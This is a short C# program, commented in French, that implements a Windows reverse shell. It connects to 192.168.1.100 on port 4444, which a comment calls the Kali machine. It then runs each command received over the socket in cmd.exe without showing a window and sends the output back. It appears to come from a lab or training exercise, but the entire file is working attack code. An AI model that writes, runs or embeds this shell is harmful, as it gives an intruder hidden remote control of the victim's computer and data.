using System;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;

namespace ReverseShell
{
    class Program
    {
        static void Main(string[] args)
        {
            string serveur = "192.168.1.100"; // ← IP de Kali
            int port = 4444;

            try
            {
                using (TcpClient client = new TcpClient(serveur, port))
                using (Stream stream = client.GetStream())
                using (StreamReader reader = new StreamReader(stream))
                using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true })
                {
                    writer.WriteLine("[+] Connexion établie avec succès.");

                    while (true)
                    {
                        string commande = reader.ReadLine();

                        if (commande.ToLower() == "exit")
                            break;

                        // Lancer le processus CMD
                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.Arguments = "/c " + commande;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.CreateNoWindow = true;
                        p.Start();

                        string output = p.StandardOutput.ReadToEnd();
                        string error = p.StandardError.ReadToEnd();

                        writer.WriteLine(output + error);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Erreur : " + ex.Message);
            }
        }
    }
}
